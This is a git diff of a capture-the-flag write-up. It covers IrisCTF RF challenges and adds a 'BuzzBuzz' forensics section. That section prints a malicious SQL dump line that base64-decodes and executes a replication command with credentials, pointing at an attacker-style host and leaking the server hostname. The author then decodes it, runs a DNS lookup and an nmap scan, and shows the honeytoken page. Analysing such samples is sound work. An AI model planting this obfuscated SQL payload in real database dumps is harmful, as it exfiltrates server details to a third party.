@@ -7,7 +7,7 @@ math: true
 cover:
     image: irisctf_banner.png
 ---
-A very nice, high quality CTF organized by IrisSec. It had several good quality Signals/RF related challenges, which is rare in the CTFs. I used the little time I had to play in this CTF focusing on the RF related challenges. 
+A very nice, high quality CTF organized by IrisSec. It had several good quality Signals/RF related challenges, which is rare in the CTFs. I used the little time I had to play in this CTF focusing on the RF challenges. 
 <!--more-->
 
 ### Radio Frequency 
@@ -39,7 +39,6 @@ The complete solution below reads and interprets the image to extract the binary
 import numpy as np
 from PIL import Image
 from Crypto.Util.number import long_to_bytes
-
 
 # from: https://github.com/ian-llewellyn/manchester-coding
 class Manchester(object):
@@ -264,8 +263,100 @@ I remembered that `mpv` the command-line media player has tons of options. Readi
 ![](2024-01-07-23-57-16.png)
 
 #### BuzzBuzz (todo)
-![](2024-01-07-23-53-14.png)
+![](2024-01-11-21-18-15.png)
+```bash
+% tar -tvzf buzzbuzz.tar.gz 
+drwxr-xr-x  0 root   root        0 Dec 31 19:00 buzzbuzz/
+-rw-r--r--  0 root   root  5936570 Dec 31 19:00 buzzbuzz/dump.zip
+-rw-r--r--  0 root   root       93 Dec 31 19:00 buzzbuzz/dump_password.txt
+-rw-r--r--  0 root   root   262639 Dec 31 19:00 buzzbuzz/notice.pdf
 
+% cat dump_password.txt 
+dump.zip password is the BTC address to pay. Good luck :)
+1ATxjNNUgMhZ54Ew9FHUiuWHmXaceKfNuj
+```
+
+
+```sql
+% grep -v ',' dump.sql
+....
+```
+
+```sql
+-
+-- Dumping data for table `users`
+--
+
+LOCK TABLES `users` WRITE;
+/*!40000 ALTER TABLE `users` DISABLE KEYS */;
+SET @b = 'U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIE1BU1RFUiBUTyBNQVNURVJfUEFTU1dPUkQ9J2J1c3liZWUxMjMnLCBNQVNURVJfUkVUUllfQ09VTlQ9MSwgTUFTVEVSX1BPUlQ9MzMwNiwgTUFTVEVSX0hPU1Q9J2QyNWQtNDRmZi1iM2FhLTFiZDU3MzMzNWNiZi5hZXlpZTRsZWkxYWlkaWU3LmluLXNjb3BlLmlyaXNjLnRmJywgTUFTVEVSX1VTRVI9J2RidXNlciIsIEBAbGNfdGltZV9uYW1lcywgQEBob3N0bmFtZSwgIic7Iik7';
+SET @s2 = FROM_BASE64(@b);
+PREPARE stmt1 FROM @s2;
+EXECUTE stmt1;
+PREPARE stmt2 FROM @bb;
+EXECUTE stmt2;
+START REPLICA;
+....
+```
+
+```bash
+% echo 'U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIE1BU1RFUiBUTyBNQVNURVJfUEFTU1dPUkQ9J2J1c3liZWUxMjMnLCBNQVNURVJfUkVUUllfQ09VTlQ9MSwgTUFTVEVSX1BPUlQ9MzMwNiwgTUFTVEVSX0hPU1Q9J2QyNWQtNDRmZi1iM2FhLTFiZDU3MzMzNWNiZi5hZXlpZTRsZWkxYWlkaWU3LmluLXNjb3BlLmlyaXNjLnRmJywgTUFTVEVSX1VTRVI9J2RidXNlciIsIEBAbGNfdGltZV9uYW1lcywgQEBob3N0bmFtZSwgIic7Iik7' | base64 -d 
+SET @bb = CONCAT("CHANGE MASTER TO MASTER_PASSWORD='busybee123', MASTER_RETRY_COUNT=1, MASTER_PORT=3306, MASTER_HOST='d25d-44ff-b3aa-1bd573335cbf.aeyie4lei1aidie7.in-scope.irisc.tf', MASTER_USER='dbuser", @@lc_time_names, @@hostname, "';");%
+
+% nslookup d25d-44ff-b3aa-1bd573335cbf.aeyie4lei1aidie7.in-scope.irisc.tf
+Server:		192.168.1.1
+Address:	192.168.1.1#53
+
+Non-authoritative answer:
+Name:	d25d-44ff-b3aa-1bd573335cbf.aeyie4lei1aidie7.in-scope.irisc.tf
+Address: 1.2.3.4
+
+ % nmap -Pn aeyie4lei1aidie7.in-scope.irisc.tf
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 21:27 EST
+Nmap scan report for aeyie4lei1aidie7.in-scope.irisc.tf (35.228.27.236)
+Host is up (0.13s latency).
+rDNS record for 35.228.27.236: 236.27.228.35.bc.googleusercontent.com
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+8080/tcp open  http-proxy                   <<<<<<   
+```
+![](2024-01-11-21-31-58.png)
+
+```html 
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Billy Bad&#39;s HoneyToken Tool</title>
+	<link rel="stylesheet" type="text/css" href="/static/css/style.css">
+	<link rel="shortcut icon" type="image/png" href="/static/png/favicon.png">
+</head>
+<body>
+	<h1>Billy Bad's HoneyToken Tool</h1>
+	<button onclick="make()">Create a HoneyToken.</button>
+
+	<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+	<script>
+		function make() {
+			alert("This feature has been temporarily disabled.");
+//			$.ajax(
+//			{
+//				type: "POST",
+//				url: "/make",
+//				success: function(data)
+//				{
+//					let trigger = data + ".aeYie4lei1aidie7.in-scope.irisc.tf";
+//					let control = "http://aeYie4lei1aidie7.in-scope.irisc.tf/manage/" + data;
+//					alert("Done. Requests to " + trigger + " can be tracked at " + control + ".");
+//				}
+//			})
+		}
+	</script>
+</body>
+</html>
+```
+![](2024-01-07-23-53-14.png)
 
 #### Birdie (todo)
 LoRa, SF=8
